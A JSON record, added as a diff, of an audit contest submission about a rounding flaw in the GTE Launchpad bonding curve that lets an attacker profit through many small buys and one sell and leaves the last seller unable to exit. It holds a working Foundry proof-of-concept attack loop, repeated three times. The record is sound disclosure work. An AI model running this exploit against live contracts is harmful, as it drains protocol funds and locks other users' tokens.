@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "Zp2vYG5pWXh",
+    "requested_finding_uid": "SBwfMsREtBu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "Zp2vYG5pWXh",
+    "source_finding_uid": "SBwfMsREtBu",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\medium_valid_Zp2vYG5pWXh.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "Zp2vYG5pWXh",
+  "finding_uid": "SBwfMsREtBu",
+  "finding_number": "77",
+  "title": "Bonding curve does not round in favour of the protocol",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "hgrano",
+  "body": "## Finding description and impact\n\nWhen users buy from the bonding curve, the amount they pay is rounded down on SimpleBondingCurve.sol:202-210:\n\n```solidity\n    function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy)\n        internal\n        pure\n        returns (uint256 quoteAmount)\n    {\n        uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;\n\n        return (quoteReserve * baseAmount) / baseReserveAfter;\n    }\n```\n\nWhen they sell, the amount they get in return also rounds down. The problem is that repeated calls to `Launchpad::buy` (which all suffer from the rounding down issue), may be followed by a single call to `Launchpad::sell` which suffers a lesser effect from rounding. This results in a potential profit for an attacker. Also, it has the potential be cause the protocol to be frozen (for a specific token) in a situation where there are few `quoteReserves` in the curve, which could occur in the early stages of the token launch or if there are a lot of users selling back their tokens to the protocol. This is because on every call to `Launchpad::buy` or `Launchpad::sell` an event is emitted on Launchpad.sol:600:\n\n```solidity\n        emit Swap({\n            buyer: account,\n            token: token,\n            baseDelta: baseDelta,\n            quoteDelta: quoteDelta,\n            nextAmountSold: curve.baseSoldFromCurve(token), // Current state after trade\n            newPrice: curve.quoteBoughtByCurve(token),\n            eventNonce: LaunchpadEventNonce.inc()\n        });\n```\n\nThe call to `curve.quoteBoughtByCurve(token)` could be problematic:\n\n```solidity\n    function quoteBoughtByCurve(address token) external view returns (uint256) {\n        return reserves[token].quoteReserve - VIRTUAL_QUOTE;\n    }\n```\n\nWe see that if `reserves[token].quoteReserve < VIRTUAL_QUOTE`, the function reverts. This could actually occur because users can take more quote tokens out of the protocol than they put in, due to the rounding issue. Potentially, all holders attempt to sell their tokens but the last seller will be unable to sell due to the revert shown above.\n\n## Recommended mitigation steps\n\nWhen performing a buy from the curve, it may be better to let the user input a certain quantity of `quoteToken` they want to spend, and then compute the output amount of `baseToken` based off this. The output amount would be this:\n\n```\nbaseReserves * inputAmount / (quoteReserves + inputAmount)\n```\n\nWhich will inherently truncate down in favour of the protocol.",
+  "proof_of_concept": "Replace the conents of PoCLaunchpad.t.sol with the below code and run the test using: `forge test --match-contract PoCLaunchpad --match-test test_submissionValidity -vvv --fuzz-seed 42`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol \n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity(uint256 q) external {\n        q = q % 0.01 ether + 0.001 ether; // q is the amount of quote tokens for the attacker to spend per buy\n\n        // User buys some tokens\n        deal(address(quoteToken), user, 1e27 ether);\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 10 ether,\n            maxAmountInQuote: type(uint256).max\n        }));\n\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        ERC20(token).approve(address(launchpad), type(uint256).max);\n\n        uint256 initQuoteTokenBal = 1e27 ether;\n        deal(address(quoteToken), attacker, initQuoteTokenBal);\n\n        // Attacker repeatedly calls buy\n        for (uint i = 0; i < 100; i++) {\n            (uint256 quoteReserves, uint256 baseReserves) = SimpleBondingCurve(address(curve)).getReserves(token);\n            uint256 maxAmount = ((q + 1) * baseReserves - 1) / (quoteReserves + q + 1);\n\n            launchpad.buy(ILaunchpad.BuyData({\n                account: attacker,\n                token: token,\n                recipient: attacker,\n                amountOutBase: maxAmount,\n                maxAmountInQuote: type(uint256).max\n            }));\n        }\n\n        // Attacker sells all their tokens\n        launchpad.sell(attacker, token, attacker, ERC20(token).balanceOf(attacker), 0);\n\n        int256 profit = int256(quoteToken.balanceOf(attacker)) - int256(initQuoteTokenBal);\n        assertGt(profit, 0, \"Must make some profit\");\n\n        // Now the other user can't sell their tokens\n        vm.stopPrank();\n        uint256 userBal = ERC20(token).balanceOf(user);\n        vm.prank(user);\n        vm.expectRevert(); // The below call causes a revert with \"arithmetic underflow or overflow\"\n        launchpad.sell(user, token, user, userBal, 0);\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/BondingCurves/SimpleBondingCurve.sol#L209"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "211",
+    "api_submission_id": "",
+    "uid": "Zp2vYG5pWXh",
+    "number": "211",
+    "title": "Bonding curve does not round in favour of the protocol",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "hgrano",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/BondingCurves/SimpleBondingCurve.sol#L209"
+    ],
+    "body": "## Finding description and impact\n\nWhen users buy from the bonding curve, the amount they pay is rounded down on SimpleBondingCurve.sol:202-210:\n\n```solidity\n    function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy)\n        internal\n        pure\n        returns (uint256 quoteAmount)\n    {\n        uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;\n\n        return (quoteReserve * baseAmount) / baseReserveAfter;\n    }\n```\n\nWhen they sell, the amount they get in return also rounds down. The problem is that repeated calls to `Launchpad::buy` (which all suffer from the rounding down issue), may be followed by a single call to `Launchpad::sell` which suffers a lesser effect from rounding. This results in a potential profit for an attacker. Also, it has the potential be cause the protocol to be frozen (for a specific token) in a situation where there are few `quoteReserves` in the curve, which could occur in the early stages of the token launch or if there are a lot of users selling back their tokens to the protocol. This is because on every call to `Launchpad::buy` or `Launchpad::sell` an event is emitted on Launchpad.sol:600:\n\n```solidity\n        emit Swap({\n            buyer: account,\n            token: token,\n            baseDelta: baseDelta,\n            quoteDelta: quoteDelta,\n            nextAmountSold: curve.baseSoldFromCurve(token), // Current state after trade\n            newPrice: curve.quoteBoughtByCurve(token),\n            eventNonce: LaunchpadEventNonce.inc()\n        });\n```\n\nThe call to `curve.quoteBoughtByCurve(token)` could be problematic:\n\n```solidity\n    function quoteBoughtByCurve(address token) external view returns (uint256) {\n        return reserves[token].quoteReserve - VIRTUAL_QUOTE;\n    }\n```\n\nWe see that if `reserves[token].quoteReserve < VIRTUAL_QUOTE`, the function reverts. This could actually occur because users can take more quote tokens out of the protocol than they put in, due to the rounding issue. Potentially, all holders attempt to sell their tokens but the last seller will be unable to sell due to the revert shown above.\n\n## Recommended mitigation steps\n\nWhen performing a buy from the curve, it may be better to let the user input a certain quantity of `quoteToken` they want to spend, and then compute the output amount of `baseToken` based off this. The output amount would be this:\n\n```\nbaseReserves * inputAmount / (quoteReserves + inputAmount)\n```\n\nWhich will inherently truncate down in favour of the protocol.",
+    "proof_of_concept": "Replace the conents of PoCLaunchpad.t.sol with the below code and run the test using: `forge test --match-contract PoCLaunchpad --match-test test_submissionValidity -vvv --fuzz-seed 42`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol \n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity(uint256 q) external {\n        q = q % 0.01 ether + 0.001 ether; // q is the amount of quote tokens for the attacker to spend per buy\n\n        // User buys some tokens\n        deal(address(quoteToken), user, 1e27 ether);\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 10 ether,\n            maxAmountInQuote: type(uint256).max\n        }));\n\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        ERC20(token).approve(address(launchpad), type(uint256).max);\n\n        uint256 initQuoteTokenBal = 1e27 ether;\n        deal(address(quoteToken), attacker, initQuoteTokenBal);\n\n        // Attacker repeatedly calls buy\n        for (uint i = 0; i < 100; i++) {\n            (uint256 quoteReserves, uint256 baseReserves) = SimpleBondingCurve(address(curve)).getReserves(token);\n            uint256 maxAmount = ((q + 1) * baseReserves - 1) / (quoteReserves + q + 1);\n\n            launchpad.buy(ILaunchpad.BuyData({\n                account: attacker,\n                token: token,\n                recipient: attacker,\n                amountOutBase: maxAmount,\n                maxAmountInQuote: type(uint256).max\n            }));\n        }\n\n        // Attacker sells all their tokens\n        launchpad.sell(attacker, token, attacker, ERC20(token).balanceOf(attacker), 0);\n\n        int256 profit = int256(quoteToken.balanceOf(attacker)) - int256(initQuoteTokenBal);\n        assertGt(profit, 0, \"Must make some profit\");\n\n        // Now the other user can't sell their tokens\n        vm.stopPrank();\n        uint256 userBal = ERC20(token).balanceOf(user);\n        vm.prank(user);\n        vm.expectRevert(); // The below call causes a revert with \"arithmetic underflow or overflow\"\n        launchpad.sell(user, token, user, userBal, 0);\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/211",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-08T08:26:18.187Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "mgVDPfCLcoT",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-15T10:16:15.385Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SBwfMsREtBu"
+        },
+        {
+          "uid": "4Z2N3745Jjg",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-15T10:16:16.745Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "SBwfMsREtBu"
+        },
+        {
+          "uid": "2XyJ66N5SAo",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-15T11:33:59.643Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "Zp2vYG5pWXh",
+          "findingUid": null
+        },
+        {
+          "uid": "yXMiQLw7npQ",
+          "userUid": "nR9vNzVqk2o",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-29T16:43:37.237Z",
+          "type": "validity",
+          "value": "wontfix",
+          "submissionUid": null,
+          "findingUid": "SBwfMsREtBu"
+        }
+      ],
+      "finding": {
+        "uid": "SBwfMsREtBu",
+        "number": 77,
+        "duplicates": 11
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "medium",
+        "validity": "valid",
+        "updatedAt": "2025-11-02T21:14:26.602Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Bonding curve does not round in favour of the protocol",
+      "uid": "Zp2vYG5pWXh",
+      "updatedAt": "2025-09-08T08:26:18.187Z",
+      "user": {
+        "uid": "ixoNvCvKWek",
+        "handle": "hgrano"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nWhen users buy from the bonding curve, the amount they pay is rounded down on SimpleBondingCurve.sol:202-210:\n\n```solidity\n    function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy)\n        internal\n        pure\n        returns (uint256 quoteAmount)\n    {\n        uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;\n\n        return (quoteReserve * baseAmount) / baseReserveAfter;\n    }\n```\n\nWhen they sell, the amount they get in return also rounds down. The problem is that repeated calls to `Launchpad::buy` (which all suffer from the rounding down issue), may be followed by a single call to `Launchpad::sell` which suffers a lesser effect from rounding. This results in a potential profit for an attacker. Also, it has the potential be cause the protocol to be frozen (for a specific token) in a situation where there are few `quoteReserves` in the curve, which could occur in the early stages of the token launch or if there are a lot of users selling back their tokens to the protocol. This is because on every call to `Launchpad::buy` or `Launchpad::sell` an event is emitted on Launchpad.sol:600:\n\n```solidity\n        emit Swap({\n            buyer: account,\n            token: token,\n            baseDelta: baseDelta,\n            quoteDelta: quoteDelta,\n            nextAmountSold: curve.baseSoldFromCurve(token), // Current state after trade\n            newPrice: curve.quoteBoughtByCurve(token),\n            eventNonce: LaunchpadEventNonce.inc()\n        });\n```\n\nThe call to `curve.quoteBoughtByCurve(token)` could be problematic:\n\n```solidity\n    function quoteBoughtByCurve(address token) external view returns (uint256) {\n        return reserves[token].quoteReserve - VIRTUAL_QUOTE;\n    }\n```\n\nWe see that if `reserves[token].quoteReserve < VIRTUAL_QUOTE`, the function reverts. This could actually occur because users can take more quote tokens out of the protocol than they put in, due to the rounding issue. Potentially, all holders attempt to sell their tokens but the last seller will be unable to sell due to the revert shown above.\n\n## Recommended mitigation steps\n\nWhen performing a buy from the curve, it may be better to let the user input a certain quantity of `quoteToken` they want to spend, and then compute the output amount of `baseToken` based off this. The output amount would be this:\n\n```\nbaseReserves * inputAmount / (quoteReserves + inputAmount)\n```\n\nWhich will inherently truncate down in favour of the protocol.",
+      "proofOfConcept": "Replace the conents of PoCLaunchpad.t.sol with the below code and run the test using: `forge test --match-contract PoCLaunchpad --match-test test_submissionValidity -vvv --fuzz-seed 42`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\nimport {ERC20} from \"@solady/tokens/ERC20.sol\";\nimport \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\n\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    /**\n     * PoC can utilize the following variables to access the relevant contracts:\n     * - factory: ERC1967Factory.sol \n     * - launchpad: Launchpad.sol\n     * - distributor: Distributor.sol\n     * - curve: SimpleBondingCurve.sol\n     * - launchpadLPVault: LaunchpadLPVault.sol\n     * - quoteToken: Quote token used in Launchpad system\n     * - uniV2Router: Uniswap V2 Router used in Launchpad system\n     */\n    function test_submissionValidity(uint256 q) external {\n        q = q % 0.01 ether + 0.001 ether; // q is the amount of quote tokens for the attacker to spend per buy\n\n        // User buys some tokens\n        deal(address(quoteToken), user, 1e27 ether);\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: 10 ether,\n            maxAmountInQuote: type(uint256).max\n        }));\n\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(attacker);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        ERC20(token).approve(address(launchpad), type(uint256).max);\n\n        uint256 initQuoteTokenBal = 1e27 ether;\n        deal(address(quoteToken), attacker, initQuoteTokenBal);\n\n        // Attacker repeatedly calls buy\n        for (uint i = 0; i < 100; i++) {\n            (uint256 quoteReserves, uint256 baseReserves) = SimpleBondingCurve(address(curve)).getReserves(token);\n            uint256 maxAmount = ((q + 1) * baseReserves - 1) / (quoteReserves + q + 1);\n\n            launchpad.buy(ILaunchpad.BuyData({\n                account: attacker,\n                token: token,\n                recipient: attacker,\n                amountOutBase: maxAmount,\n                maxAmountInQuote: type(uint256).max\n            }));\n        }\n\n        // Attacker sells all their tokens\n        launchpad.sell(attacker, token, attacker, ERC20(token).balanceOf(attacker), 0);\n\n        int256 profit = int256(quoteToken.balanceOf(attacker)) - int256(initQuoteTokenBal);\n        assertGt(profit, 0, \"Must make some profit\");\n\n        // Now the other user can't sell their tokens\n        vm.stopPrank();\n        uint256 userBal = ERC20(token).balanceOf(user);\n        vm.prank(user);\n        vm.expectRevert(); // The below call causes a revert with \"arithmetic underflow or overflow\"\n        launchpad.sell(user, token, user, userBal, 0);\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/BondingCurves/SimpleBondingCurve.sol#L209",
+      "number": 211,
+      "aiExplanation": null,
+      "_index": 211
+    }
+  }
+}
